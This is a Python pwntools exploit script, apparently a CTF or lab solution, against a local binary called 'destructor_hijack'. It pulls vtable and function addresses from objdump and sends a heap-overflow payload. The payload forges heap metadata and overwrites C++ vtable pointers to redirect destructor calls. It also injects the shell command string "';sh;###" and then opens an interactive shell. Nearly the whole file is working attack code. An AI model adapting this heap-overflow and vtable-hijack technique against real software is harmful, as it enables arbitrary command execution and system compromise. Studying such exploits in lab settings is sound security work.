#!/usr/bin/env python3

from pwn import *

#target = process(["/bin/ltrace", "../bin/destructor_hijack"])
target = process("../bin/destructor_hijack")

employee_vtable = subprocess.check_output(["objdump -d ../bin/destructor_hijack | grep '<_ZTV8Employee+0x10'"], shell=True).split()
employee_vtable = employee_vtable[employee_vtable.index(b"#") + 1]
employee_vtable = int(employee_vtable, 16)

project_vtable = subprocess.check_output(["objdump -d ../bin/destructor_hijack | grep '<_ZTV7Project+0x10'"], shell=True).split()
project_vtable = project_vtable[project_vtable.index(b"#") + 1]
project_vtable = int(project_vtable, 16)

announce_func_addr = subprocess.check_output(["objdump -d ../bin/destructor_hijack | grep '<_Z13announceUsersPc'"], shell=True).split()[0]
announce_func_addr = int(announce_func_addr, 16)

print(f"employee_vtable: {hex(employee_vtable)}, project_vtable: {hex(project_vtable)}")
print(f"announceUsers: {hex(announce_func_addr)}")

payload = b"a" * 8 * 7                                       # one employee entry on the heap
payload += p64(0) + p64(0x51)                                # heap metadata
payload += p64(employee_vtable - 0x10)                       # overwrite second employee vtable to call printName instead of deassignProject to execute RSI = _name
payload += b"';sh;###" + b"a" * 8 * 6                        # one employee entry on the heap with command injection
payload += p64(0) + p64(0x51)                                # heap metadata
payload += p64(project_vtable - 0x20)                        # overwrite third employee vtable with project vtable to call releaseProject()
payload += b".hidden!" + b"b" * 16 + p64(announce_func_addr) # padding and align correctly the announceUsers() address to correspond with onProjectRelease callback

target.sendlineafter(b"Insert name for new employee:\n", payload)
target.interactive()
